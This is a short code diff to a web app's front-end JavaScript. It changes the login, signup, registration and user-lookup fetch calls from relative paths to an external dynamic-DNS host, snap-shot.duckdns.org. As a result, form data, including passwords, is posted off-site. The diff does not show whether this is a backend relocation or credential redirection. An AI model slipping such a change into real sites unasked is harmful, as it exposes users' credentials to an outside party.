@@ -101,7 +101,7 @@
       password: password
     };
     // Send a POST request to the backend to initiate login
-    fetch('/login', {
+    fetch('https://snap-shot.duckdns.org/login', { 
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
@@ -133,7 +133,7 @@
       password: password
     };
     // Send a POST request to the backend to initiate signup
-    fetch('/signup', {
+    fetch('https://snap-shot.duckdns.org/signup', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
@@ -187,7 +187,7 @@
         document.getElementById('registration-form').addEventListener('submit', function(e) {
             e.preventDefault();
             var formData = new FormData(e.target);
-            fetch('/register', {
+            fetch('https://snap-shot.duckdns.org/register', {
                 method: 'POST',
                 body: formData
             })
@@ -205,7 +205,7 @@
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
             var formData = new FormData(e.target);
-            fetch('/login', {
+            fetch('https://snap-shot.duckdns.org/login', {
                 method: 'POST',
                 body: formData
             })
@@ -222,7 +222,7 @@
         });
         // Function to get user details
         function getUserDetails(user_id) {
-            fetch('/user/' + user_id)
+            fetch('https://snap-shot.duckdns.org/user/' + user_id)
             .then(response => response.json())
             .then(data => {
                 if (data.username) {
